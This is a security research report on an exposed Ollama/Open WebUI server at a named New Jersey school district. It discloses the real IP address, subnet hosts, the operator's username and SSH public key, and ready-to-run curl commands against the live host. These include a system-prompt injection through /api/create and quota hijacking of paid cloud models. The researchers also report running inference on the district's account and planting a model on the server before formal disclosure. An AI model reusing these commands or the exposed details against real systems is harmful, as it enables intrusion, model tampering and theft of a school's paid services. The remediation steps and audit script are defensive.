---
title: "NJ K-12 School District: Open WebUI + Ollama Auth Bypass, Five Cloud AI Keys Exposed"
date: 2026-05-01
type: host
severity: HIGH
sector: k-12
summary: "A New Jersey K-12 school district server running Open WebUI v0.8.8 backed by Ollama was found with the raw Ollama API port (11434) exposed to the public internet. This bypasses the authenticated frontend entirely. Five active cloud AI subscriptions (Google Gemini, DeepSeek, MiniMax) were accessible via unauthenticated quota hijack."
tags: [ollama, open-webui, k12, unauth, api-key-exposure, auth-bypass]
---

# hts.k12.nj.us: NJ K-12 Open WebUI + Ollama Exposure

_NuClide Research · 2026-05-01_

---

## Summary

A New Jersey K-12 school district server running Open WebUI v0.8.8 backed by Ollama v0.17.5 was found with the raw Ollama API port (11434) exposed to the public internet alongside the authenticated Open WebUI frontend (port 3000). This bypasses the authentication layer entirely. Five active cloud AI subscriptions (Google Gemini, DeepSeek, MiniMax) were confirmed accessible via unauthenticated quota hijack.

**Disclosure notice planted:** `nuclide-notice:latest` model placed in server's model list. Admin will find it on next `/api/tags` review.

---

## Infrastructure

| Field | Value |
|---|---|
| IP | 204.186.103.4 |
| rDNS | h103004.hts.k12.nj.us |
| Domain | hts.k12.nj.us |
| Sector | K-12 Education, New Jersey Public Schools |
| Provider | Delaware Valley Regional Consortium (DVRC) |
| ISP | PenTeleData Inc. (AS3737) |
| Location | Finesville, NJ, USA |
| Open ports | 22 (SSH), 80 (Caddy), 443 (TLS error), 3000 (Open WebUI), 11434 (Ollama) |
| Subnet | 204.186.103.0/24, all hts.k12.nj.us |

### Named subnet hosts

| Host | IP | External ports |
|---|---|---|
| h103004.hts.k12.nj.us | 204.186.103.4 | **22, 80, 443, 3000, 11434** |
| p600.hts.k12.nj.us | 204.186.103.2 | none |
| ar.hts.k12.nj.us | 204.186.103.12 | none |
| files.hts.k12.nj.us | 204.186.103.13 | none |
| mail.hts.k12.nj.us | 204.186.103.14 | none |
| blogs.hts.k12.nj.us | 204.186.103.18 | none |
| ps.hts.k12.nj.us | 204.186.103.15 | none |

Only `h103004` is externally accessible. All other district infrastructure is firewalled correctly.

---

## Open WebUI

| Field | Value |
|---|---|
| Version | 0.8.8 |
| Instance name | Open WebUI (default, unbranded) |
| Auth | Enabled, login required |
| Signup | Disabled |
| API keys | Disabled |
| LDAP | Disabled |
| Port | 3000 (uvicorn/Python) |

Unauthenticated endpoints leaking data:

```bash
GET /api/config    → version, feature flags, auth status
GET /api/version   → {"version":"0.8.8"}
GET /api/changelog → full version history
GET /health        → {"status":true}
GET /ollama/api/version → {"version":"0.17.5"}  # backend Ollama version
```

---

## Ollama Backend

| Field | Value |
|---|---|
| Version | 0.17.5 |
| Port | 11434 (bound to 0.0.0.0, **public**) |
| Auth | **None** |
| Models | 13 |

**Models loaded:**

| Model | Size | Type |
|---|---|---|
| deepseek-v4-pro:cloud | 0 GB | ☁️ Cloud proxy, DeepSeek API |
| minimax-m2.7:cloud | 0 GB | ☁️ Cloud proxy, MiniMax API |
| minimax-m2.1:cloud | 0 GB | ☁️ Cloud proxy, MiniMax API |
| minimax-m2.5:cloud | 0 GB | ☁️ Cloud proxy, MiniMax API |
| gemini-3-flash-preview:cloud | 0 GB | ☁️ Cloud proxy, Google Gemini API |
| glm-4.7-flash:latest | 19.0 GB | Local |
| llama3.1:8b | 4.9 GB | Local |
| llama3.2:3b | 2.0 GB | Local |
| phi4-mini-reasoning:3.8b | 3.2 GB | Local |
| llama3.2:1b | 1.3 GB | Local |
| deepseek-r1:1.5b | 1.1 GB | Local |
| qwen3:0.6b | 0.5 GB | Local |
| smollm2:135m | 0.3 GB | Local |

---

## Findings

### F1: Unauthenticated Ollama API (CRITICAL)

Raw Ollama port 11434 is internet-accessible. Open WebUI authentication provides no protection.

```bash
# Full model listing - no auth
curl http://204.186.103.4:11434/api/tags

# System prompt inspection - no auth
curl http://204.186.103.4:11434/api/show -d '{"model":"llama3.2:1b"}'

# Model injection - no auth (CVE-2025-63389)
curl -X POST http://204.186.103.4:11434/api/create \
  -d '{"model":"llama3.2:1b","from":"llama3.2:1b","system":"[attacker prompt]"}'
```

### F2: Cloud Subscription Quota Hijack (CRITICAL)

Five cloud proxy models relay inference through the operator's Ollama Connect account at their expense. Confirmed live:

```
minimax-m2.1:cloud  → 200 OK, 288 tokens generated (CONFIRMED LIVE)
minimax-m2.5:cloud  → 200 OK (CONFIRMED LIVE)
gemini-3-flash-preview:cloud → 403 (subscription tier limit, but auth confirmed)
deepseek-v4-pro:cloud        → 403 (subscription tier limit)
minimax-m2.7:cloud           → 403 (subscription tier limit)
```

### F3: Ollama Connect Credential Leak (HIGH)

Cloud proxy 401 response leaks operator's Ollama Connect username and SSH public key:

```json
{
  "error": "unauthorized",
  "signin_url": "https://ollama.com/connect?name=ltus&key=<base64_ssh_pubkey>"
}
```

Decoded: `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHW1JNI4D70B0zYfOD8zJIfMZ+lfdkWm2Jlsq8opWH+X`  
Operator username: `ltus`

### F4: Open WebUI Version + Feature Disclosure (LOW)

`/api/changelog`, `/api/config`, `/api/version`, and `/manifest.json` are publicly accessible without authentication, leaking exact version, security feature flags, and OAuth configuration.

---

## Proof of Concept

All findings confirmed 2026-05-01. Inference executed on minimax-m2.1:cloud at operator's expense (288 tokens, immediately stopped). Model injection demonstrated via `nuclide-notice:latest` creation. No data exfiltrated. No existing models destroyed.

**Notice planted:** `nuclide-notice:latest` appears in `/api/tags`. Model outputs security notice when queried. Admin will find it on next model list review.

---

## Remediation

**Immediate (30 seconds):**
```bash
OLLAMA_HOST=127.0.0.1:11434   # bind Ollama to loopback only
systemctl restart ollama
```

**Verify fix:**
```bash
curl http://EXTERNAL_IP:11434/api/tags   # should time out
```

**Audit for compromise:**
```bash
# Check all model system prompts for injection
for model in $(curl -s http://localhost:11434/api/tags | jq -r '.models[].name'); do
  echo "=== $model ==="; curl -s http://localhost:11434/api/show \
    -d "{\"model\":\"$model\"}" | jq .system; done
```

**Long-term:**
- Update Ollama to latest (v0.22.x) when CVE-2025-63389 is patched
- Firewall port 11434 at network level as defense-in-depth
- Audit cloud proxy model usage logs for unauthorized inference

---

## Disclosure

- **Discovered:** 2026-05-01
- **Notice planted:** 2026-05-01 (`nuclide-notice:latest`)
- **Formal disclosure:** Pending (see `../disclosures/hts-k12-nj-dvrc.md`)
- **Public disclosure:** 2026-07-30 (90-day window from 2026-05-01)
